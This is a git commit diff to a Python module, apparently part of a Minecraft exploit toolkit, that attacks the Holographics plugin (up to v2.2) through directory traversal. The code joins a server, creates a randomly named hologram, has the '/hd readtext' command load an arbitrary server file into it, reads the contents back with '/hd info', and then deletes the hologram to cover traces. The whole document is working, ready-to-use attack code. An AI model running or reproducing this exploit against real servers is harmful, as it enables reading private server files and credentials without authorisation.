0ef528eb0131fd9d7b5bb9dda888ac7b86362d7e
Joey <jholm6332@dysartstudents.org>
2022-03-24 17:18:41 -0700

    improved holographics.py

--- modules/holographics.py
+++ modules/holographics.py
@@ -4,14 +4,16 @@ from minecraft.networking.packets import Packet, clientbound, serverbound
 import sys
 import time
 import random
+import string
 
 
 class Exploit:
     """Exploit schema"""
-    def __init__(self, client: Connection=None):
+    def __init__(self, client: Connection = None, directory: str = None):
         self.name = "Holographics <= v2.2.*"
         self.description = "Read existing backend file paths via directory traversal"
         self.client = client
+        self.directory = directory
 
     def onJoin(self, dog):
         print('Connected', dog)
@@ -26,27 +28,32 @@ class Exploit:
         self.client.register_packet_listener(
             self.onJoin, minecraft.networking.packets.JoinGamePacket)
 
-        hologramName = input("Hologram Name: ")
-        directory = input("File Directory: ")
-
         self.client.connect()
 
         input('Press enter joined.')
 
+        holoName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+
         time.sleep(1.5)
 
         packet = minecraft.networking.packets.ChatPacket()  #: chat packet structure
-        packet.message = "/hd create {}".format(hologramName)  #: creates hologram
+
+        packet.message = "/hd create %s" % holoName  #: creates hologram
         self.client.write_packet(packet)  #: sends message
 
         time.sleep(2.0)
 
-        packet.message = "/hd readtext {} {}".format(hologramName, directory)  #: pastes lines from file into hologram
+        packet.message = f"/hd readtext %s %s" % (holoName, self.directory)  #: pastes lines from file into hologram
         self.client.write_packet(packet)  #: sends message
 
         time.sleep(2.0)
 
-        packet.message = "/hd info {}".format(hologramName)  #: lists all lines from hologram
+        packet.message = "/hd info %s" % holoName  #: lists all lines from hologram
+        self.client.write_packet(packet)  #: sends message
+
+        time.sleep(2.0)
+
+        packet.message = "/hd delete %s" % holoName  #: lists all lines from hologram
         self.client.write_packet(packet)  #: sends message
 
         input('Press enter joined.')
